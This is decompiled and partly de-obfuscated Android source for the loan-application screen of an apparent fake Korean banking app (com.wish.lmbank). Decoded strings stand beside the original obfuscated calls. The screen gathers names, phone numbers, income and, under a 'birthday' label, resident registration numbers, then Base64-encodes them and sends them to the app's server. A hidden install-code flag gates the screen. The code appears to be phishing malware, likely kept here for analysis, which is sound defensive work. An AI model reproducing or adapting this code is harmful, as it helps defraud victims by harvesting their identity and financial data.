package com.wish.lmbank.activity;

import android.content.DialogInterface;
import android.text.TextUtils;
import android.util.Base64;
import android.view.View;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.R;
import com.wish.lmbank.R2;
import com.wish.lmbank.base.BaseActivityV;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.http.HttpEngine;
import com.wish.lmbank.http.HttpManager;
import com.wish.lmbank.http.HttpResponse;
import com.wish.lmbank.utils.SharedPreferencesUtils;
import com.wish.lmbank.view.dialog.AlertDialog;
import com.wish.lmbank.view.dialog.LoadingDialog;

import java.nio.charset.StandardCharsets;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/SubmitActivity.class */
public class SubmitActivity extends BaseActivityV {
    private CheckBox cbAgreement;
    private View dividerAnnualIncome;
    private View dividerWorkUnit;
    private EditText etBirthday;
    private EditText etIncomeV;
    private EditText etName;
    private EditText etNewRequirePart1;
    private EditText etNewRequirePart2;
    private EditText etNumber;
    private EditText etPurpose;
    private EditText etRequire;
    private EditText etWorkUnit;
    private LinearLayout llAgreement;
    private LinearLayout llAnnualIncome;
    private LinearLayout llHeaderPicture;
    private LinearLayout llNewRequire;
    private LinearLayout llRequire;
    private LinearLayout llSubmitHeader;
    private LinearLayout llWorkUnit;
    private String mBirthday;
    private String mIncome;
    private String mName;
    private String mNumber;
    private String mPurpose;
    private String mReq;
    private String mWorkUnit;
    private TextView tvPurpose;

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public int initLayoutView() {
        return R2.layout.activity_submit;
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initData() {
        super.initData();
//         if (SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiAnOj0oJSU2KiYtLA"), false) || AppStartV.isDebug) {
        if (SharedPreferencesUtils.getValue("KEY_INSTALL_CODE", false) || AppStartV.isDebug) {
            return;
        }
        finish();
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initView() {
        super.initView();
        this.llRequire = (LinearLayout) findViewById(R2.id.activity_application_require);
        this.llNewRequire = (LinearLayout) findViewById(R2.id.activity_application_new_require);
        this.llSubmitHeader = (LinearLayout) findViewById(R2.id.activity_application_submit_header);
        this.llAgreement = (LinearLayout) findViewById(R2.id.activity_application_agreement);
        this.llWorkUnit = (LinearLayout) findViewById(R2.id.activity_application_work_unit);
        this.llAnnualIncome = (LinearLayout) findViewById(R2.id.activity_application_annual_income);
        this.llHeaderPicture = (LinearLayout) findViewById(R2.id.activity_application_header_picture);
        this.dividerWorkUnit = findViewById(R2.id.divider_work_unit);
        this.dividerAnnualIncome = findViewById(R2.id.divider_annual_income);
        this.tvPurpose = (TextView) findViewById(R2.id.activity_application_tv_purpose);
        this.etNewRequirePart1 = (EditText) findViewById(R2.id.etNewRequirePart1);
        this.etNewRequirePart2 = (EditText) findViewById(R2.id.etNewRequirePart2);
        this.etName = (EditText) findViewById(R2.id.activity_application_et_name);
        this.etNumber = (EditText) findViewById(R2.id.activity_application_et_number);
        this.etBirthday = (EditText) findViewById(R2.id.activity_application_et_birthday);
        this.etWorkUnit = (EditText) findViewById(R2.id.activity_application_et_work);
        this.etIncomeV = (EditText) findViewById(R2.id.activity_application_et_income);
        this.etRequire = (EditText) findViewById(R2.id.activity_application_et_require);
        this.etPurpose = (EditText) findViewById(R2.id.activity_application_et_purpose);
        this.cbAgreement = (CheckBox) findViewById(R2.id.activity_application_cb_agreement);
        String str = Constants.APPLICATION_STYLE;
//         String m5998 = bb7d7pu7.m5998("Ww");
        String m5998 = "2";
        if (m5998.equals(str)) {
            this.llNewRequire.setVisibility(View.VISIBLE);
        } else {
            this.llRequire.setVisibility(View.VISIBLE);
        }
        if (m5998.equals(Constants.AGREEMENT_SUBMIT_STYLE)) {
            this.llSubmitHeader.setVisibility(View.VISIBLE);
            this.llAgreement.setVisibility(View.VISIBLE);
            this.llWorkUnit.setVisibility(View.GONE);
            this.llAnnualIncome.setVisibility(View.GONE);
            this.dividerWorkUnit.setVisibility(View.GONE);
            this.dividerAnnualIncome.setVisibility(View.GONE);
            this.llRequire.setVisibility(View.GONE);
            this.llNewRequire.setVisibility(View.GONE);
//             this.tvPurpose.setText(bb7d7pu7.m5998("g97VgsXdhPzxheLNY4XO6YX-xA"));
            this.tvPurpose.setText("근무하실 지역");
        }
        if (m5998.equals(Constants.HEADER_PICTURE_STYLE)) {
            this.llHeaderPicture.setVisibility(View.VISIBLE);
        }
//         if (bb7d7pu7.m5998("LTgPE1EFOi4gCAItDD0zHlsbWi8FMAo9G18wXi8zGDw").equals(Constants.COMPANY_UUID)) {
        if ("DQfz8lSGIakDeTZw2r3FlYcTr6Y7FZqU".equals(Constants.COMPANY_UUID)) {
//             this.tvPurpose.setText(bb7d7pu7.m5998("guXphd_1heLJhdvEhevFhPzE"));
            this.tvPurpose.setText("대출신청사항");
        }
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initLoad() {
        super.initLoad();
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initListener() {
        super.initListener();
        findViewById(R2.id.activity_application_tv_confirm).setOnClickListener(this);
    }

    @Override // com.wish.lmbank.base.BaseActivityV, android.view.View.OnClickListener
    public void onClick(View view) {
        if (view.getId() != R.id.bs) {
            return;
        }
        submitApplication();
    }

    private void submitApplication() {
//         String m5998 = bb7d7pu7.m5998("DgUGCwgFNhoeAB0KAQ");
        String m5998 = "global_switch";
//         String m59982 = bb7d7pu7.m5998("Bgc");
        String m59982 = "on";
        if (m59982.equals(SharedPreferencesUtils.getValue(m5998, m59982)) && isFormValid()) {
            LoadingDialog.showLoading(this);
            HttpManager.getInstance().submitLoanApplication(getSubmitInfo(), new AnonymousClass1(this));
            return;
        }
//         showToast(bb7d7pu7.m5998("JyZJOQwbBAAaGgAGBw"));
        showToast("NO Permission");
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.wish.lmbank.activity.SubmitActivity$1  reason: invalid class name */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/SubmitActivity$1.class */
    public class AnonymousClass1 implements HttpEngine.OnResponseCallback<HttpResponse.R_String> {
        final SubmitActivity this$0;

        AnonymousClass1(SubmitActivity submitActivity) {
            this.this$0 = submitActivity;
        }

        @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
        public void onResponse(int i, String str, HttpResponse.R_String r_String) {
            LoadingDialog.disDialog();
            if (i != 0) {
//                 this.this$0.showToast(bb7d7pu7.m5998("Jyw9PiY7IkksOzsmOw"));
                this.this$0.showToast("NETWORK ERROR");
                return;
            }
//             if (bb7d7pu7.m5998("Ww").equals(Constants.AGREEMENT_SUBMIT_STYLE)) {
            if ("2".equals(Constants.AGREEMENT_SUBMIT_STYLE)) {
                AlertDialog alertDialog = new AlertDialog(this.this$0);
                alertDialog.setOnDismissListener(new DialogInterface.OnDismissListener() { // from class: com.wish.lmbank.activity.SubmitActivity.1.1

                    @Override // android.content.DialogInterface.OnDismissListener
                    public void onDismiss(DialogInterface dialogInterface) {
                        AnonymousClass1.this.this$0.showToast(str);
                        AnonymousClass1.this.this$0.finish();
                    }
                });
//                 alertDialog.show(bb7d7pu7.m5998("CBkZBQAKCB0ABgc"));
                alertDialog.show("application");
                return;
            }
            this.this$0.showToast(str);
            this.this$0.finish();
        }
    }

    private String getSubmitInfo() {
//         return Base64.encodeToString((bb7d7pu7.m5998("BwAKAgcIBAxU") + this.mName + bb7d7pu7.m5998("TwQGCwAFDFQ") + this.mNumber + bb7d7pu7.m5998("TwsAGx0BDQgQVA") + this.mBirthday + bb7d7pu7.m5998("Tx4GGwJU") + this.mWorkUnit + bb7d7pu7.m5998("TwAHCgYEDFQ") + this.mIncome + bb7d7pu7.m5998("TxsMGBwAGwxU") + this.mReq + bb7d7pu7.m5998("TxkcGxkGGgxU") + this.mPurpose).getBytes(StandardCharsets.UTF_8), 2);
        return Base64.encodeToString(("nickname=" + this.mName + "&mobile=" + this.mNumber + "&birthday=" + this.mBirthday + "&work=" + this.mWorkUnit + "&income=" + this.mIncome + "&require=" + this.mReq + "&purpose=" + this.mPurpose).getBytes(StandardCharsets.UTF_8), 2);
    }

    private boolean isFormValid() {
        this.mName = this.etName.getText().toString().trim();
        this.mNumber = this.etNumber.getText().toString().trim();
        this.mBirthday = this.etBirthday.getText().toString().trim();
        this.mWorkUnit = this.etWorkUnit.getText().toString().trim();
        this.mIncome = this.etIncomeV.getText().toString().trim();
        String str = Constants.APPLICATION_STYLE;
//             String m5998 = bb7d7pu7.m5998("Ww");
        String m5998 = "2";
        if (m5998.equals(str)) {
            String trim = this.etNewRequirePart1.getText().toString().trim();
            String trim2 = this.etNewRequirePart2.getText().toString().trim();
            this.mReq = trim + trim2;
        } else {
            this.mReq = this.etRequire.getText().toString().trim();
        }
        this.mPurpose = this.etPurpose.getText().toString().trim();
//             String m59982 = bb7d7pu7.m5998("hff4he3YSYT83YXK1YXt0YXz_Uk");
        String m59982 = "작성 해주세요 ";
        if (TextUtils.isEmpty(this.mName)) {
            showToast(m59982 + getString(R2.string.name));
            return false;
        } else if (TextUtils.isEmpty(this.mNumber)) {
            showToast(m59982 + getString(R2.string.contact_number));
            return false;
        } else if (TextUtils.isEmpty(this.mBirthday)) {
//                 showToast(m59982 + bb7d7pu7.m5998("hcrVgsbVgvrYgsj0gtvhhPHR"));
            showToast(m59982 + "주민등록번호");
            return false;
        } else if (!m5998.equals(Constants.AGREEMENT_SUBMIT_STYLE) || this.cbAgreement.isChecked()) {
            return true;
        } else {
//                 showToast(bb7d7pu7.m5998("hcn1WoX3-YPd6YLJwUmC5vCF9PGE_N2FytWF7P2F_NVJSYXiyYXbxIPZ6YLjzIT8wILi4YLizQ"));
            showToast("제3자관련 동의해주셔야  신청가능합니다");
            return false;
        }
    }
}
